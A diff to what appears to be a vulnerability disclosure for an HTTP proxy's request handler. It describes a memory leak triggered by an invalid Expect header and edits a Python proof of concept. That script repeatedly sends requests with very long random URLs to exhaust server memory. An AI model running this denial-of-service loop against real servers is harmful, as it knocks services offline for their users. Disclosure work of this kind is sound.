@@ -43,7 +43,7 @@ httpClientRequest(HTTPRequestPtr request, AtomPtr url)
 }
 ```
 
-when expect variable not valid,url variable not free. this can lead dos
+When the expect variable's value is invalid, the url variable is not freed, which leads to server memory leaks and thus denial-of-service
 
 # poc
 
@@ -61,8 +61,8 @@ ascii_chars = [chr(i) for i in range(33, 127)]
 while True:
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((host, port))
-    random_str = ''.join(random.choices(ascii_chars, k=32700))
-    data = ("GET "+ random_str + " HTTP/1.0" +"\nexpect:CCC\n\n").encode()
+    evil_url = ''.join(random.choices(ascii_chars, k=32700))
+    data = ("GET "+ evil_url + " HTTP/1.0" +"\nexpect:CCC\n\n").encode()
     client_socket.sendall(data)
     client_socket.close()
 ```
